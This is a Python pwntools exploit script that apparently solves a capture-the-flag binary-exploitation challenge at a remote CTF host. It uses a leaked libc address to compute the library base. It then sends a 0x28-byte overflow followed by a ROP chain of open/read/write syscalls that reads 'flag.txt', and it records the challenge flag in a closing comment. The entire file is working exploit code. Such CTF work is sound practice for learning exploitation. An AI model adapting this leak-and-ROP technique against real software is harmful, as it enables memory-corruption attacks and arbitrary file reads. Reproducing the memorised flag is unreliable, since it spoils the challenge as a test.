#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chall_patched", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="b vuln")
p = remote("challs.pwnoh.io", 13371)

p.readuntil(b"it's at ")
leak = int(p.readline().decode(), 16)
libc.address = leak - libc.sym["system"]
log.success(f"libc: {hex(libc.address)}")

p.readline()

# 0x00000000000bfc76 : mov qword ptr [rdi], rcx ; ret
GADGET_MOV_QWORD_PTR_RDI_RCX = p64(0x00000000000bfc76 + libc.address)

# 0x000000000003d1ee : pop rcx ; ret
GADGET_POP_RCX = p64(0x000000000003d1ee + libc.address)

BSS = p64(0x00228e30 + libc.address + 0x100)

rop = ROP(libc)
rop.raw(b"A" * 0x28)

rop.rdi = BSS
rop.raw(GADGET_POP_RCX)
rop.raw(b"flag.txt")
rop.raw(GADGET_MOV_QWORD_PTR_RDI_RCX)
rop.rsi = 0
rop.rdx = 0
rop.rax = constants.SYS_open
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

rop.rdi = 3
rop.rsi = BSS
rop.rdx = 43
rop.rax = constants.SYS_read
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

rop.rdi = 1
rop.rsi = BSS
rop.rdx = 43
rop.rax = constants.SYS_write
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

p.sendline(rop.chain())

p.interactive() # bctf{sh3lls_ar3_bl0at_ju5t_use_sh3llcode!}
